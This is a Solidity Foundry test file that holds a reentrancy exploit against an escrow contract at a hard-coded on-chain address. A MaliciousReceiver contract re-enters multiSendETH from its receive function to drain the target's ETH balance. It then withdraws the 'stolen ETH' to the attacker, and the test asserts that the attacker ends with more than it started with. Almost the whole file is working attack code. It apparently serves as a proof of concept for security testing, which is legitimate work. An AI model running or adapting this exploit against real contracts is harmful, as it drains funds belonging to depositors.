pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Escrow {
    function multiSendETH(address[] calldata _recipients, uint256[] calldata _amounts) external payable;
    function deposit() external payable;
    function balanceOf(address _owner) external view returns (uint256);
}

contract MaliciousReceiver {
    address public target;
    address public attacker;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 3; // Re-enter multiple times

    function setTarget(address _target) external {
        target = _target;
    }

    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }

    receive() external payable {
        if (reentrancyCount < maxReentrancy && target != address(0)) {
            reentrancyCount++;

            // Prepare arrays for re-entrancy
            address[] memory recipients = new address[](1);
            uint256[] memory amounts = new uint256[](1);

            // Send to ourselves again
            recipients[0] = address(this);
            amounts[0] = 0.1 ether;

            // Re-enter multiSendETH with 0 ETH value
            // The contract will send 0.1 ETH from its balance
            // The check will pass because totalAmount (0.1) <= msg.value (0.1 from original call)
            Escrow(target).multiSendETH{value: 0}(recipients, amounts);
        }
    }

    // Function to withdraw stolen ETH to attacker
    function withdraw() external {
        payable(attacker).transfer(address(this).balance);
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x89d7c52b999DE0f2D862eD944203BFA0526AE973;
    address attacker = address(this);
    MaliciousReceiver malicious;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Create malicious contract and ensure target has ETH
        malicious = new MaliciousReceiver();

        // Fund the target contract with some ETH (simulate a user deposit)
        deal(address(TARGET), 10 ether);

        // Label for clarity
        vm.label(address(malicious), "MaliciousReceiver");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = address(this).balance;

        // First, fund the target contract with ETH (via its receive function)
        // This gives the contract ETH balance to be drained
        payable(TARGET).transfer(10 ether);

        // Create malicious contract
        malicious = new MaliciousReceiver();
        malicious.setTarget(TARGET);
        malicious.setAttacker(address(this));

        // Prepare arrays for multiSendETH
        address[] memory recipients = new address[](1);
        uint256[] memory amounts = new uint256[](1);

        // Only send to malicious contract
        recipients[0] = address(malicious);
        amounts[0] = 0.1 ether; // Will trigger re-entrancy

        // Call multiSendETH with only 0.1 ETH msg.value
        // But the contract has 10 ETH balance from our transfer
        Escrow(TARGET).multiSendETH{value: 0.1 ether}(recipients, amounts);

        // The malicious contract should have received ETH and re-entered
        // Now withdraw stolen ETH from malicious contract to attacker
        malicious.withdraw();

        // Check if we profited
        uint256 finalBalance = address(this).balance;
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Contract balance:", address(TARGET).balance);
        assertGt(finalBalance, initialBalance, "Exploit failed: balance did not increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
